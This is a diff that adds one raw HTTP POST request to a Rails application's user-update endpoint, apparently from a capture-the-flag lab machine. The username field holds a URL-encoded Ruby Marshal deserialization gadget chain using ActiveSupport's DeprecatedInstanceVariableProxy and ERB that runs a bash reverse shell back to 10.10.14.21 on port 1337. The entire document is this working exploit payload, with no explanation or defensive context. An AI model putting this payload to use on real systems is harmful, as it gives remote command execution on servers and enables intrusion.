@@ -1,0 +1,15 @@
+POST /users/23 HTTP/1.1
+Host: 10.10.10.211:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.211:8080/users/23/edit
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 601
+Origin: http://10.10.10.211:8080
+Connection: close
+Cookie: _session_id=7ffc41e3133f05a5b3f8fb03fdf9ec0e
+Upgrade-Insecure-Requests: 1
+
+utf8=%E2%9C%93&_method=patch&authenticity_token=X2y6fHyuLyGOmz5ZOqpHKZ%2FEUXoSdiuyh%2BOUgbypJfhh1JWaqPnItSLunTxUsi5U9ugnTPJ1hSyJNfFqQVGAOw%3D%3D&user%5Busername%5D=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3F%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.21%2F1337+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&commit=Update+User
